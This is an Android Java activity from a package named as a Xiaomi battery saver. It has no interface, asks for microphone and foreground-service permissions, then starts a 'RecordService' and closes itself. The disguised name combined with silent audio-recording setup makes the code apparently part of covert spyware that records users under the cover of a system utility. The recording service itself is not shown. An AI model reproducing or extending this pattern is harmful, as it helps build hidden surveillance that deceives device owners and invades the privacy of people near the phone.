package com.xiaomi.batterysaver.service;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class PermissionActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final String[] REQUIRED_PERMISSIONS = {
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.FOREGROUND_SERVICE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No UI is set for this activity as its main purpose is to request permissions
        requestPermissions();
    }

    private void requestPermissions() {
        if (!hasAllPermissions()) {
            // Request the missing permissions
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
        } else {
            // All permissions are already granted, proceed to start the recording service
            proceedToStartRecordingService();
        }
    }

    private boolean hasAllPermissions() {
        // Check each required permission
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                // Return false if any permission is not granted
                return false;
            }
        }
        // All permissions are granted
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0) {
                for (int grantResult : grantResults) {
                    if (grantResult != PackageManager.PERMISSION_GRANTED) {
                        // If any permission is not granted, finish the activity
                        finish();
                        return;
                    }
                }
                // All permissions have been granted, proceed to start the recording service
                proceedToStartRecordingService();
            } else {
                // Permission request was cancelled, finish the activity
                finish();
            }
        }
    }

    private void proceedToStartRecordingService() {
        // Start the recording service directly after permissions are granted
        Intent serviceIntent = new Intent(this, RecordService.class);
        startService(serviceIntent);
        // Finish this activity so it's removed from the back stack
        finish();
    }
}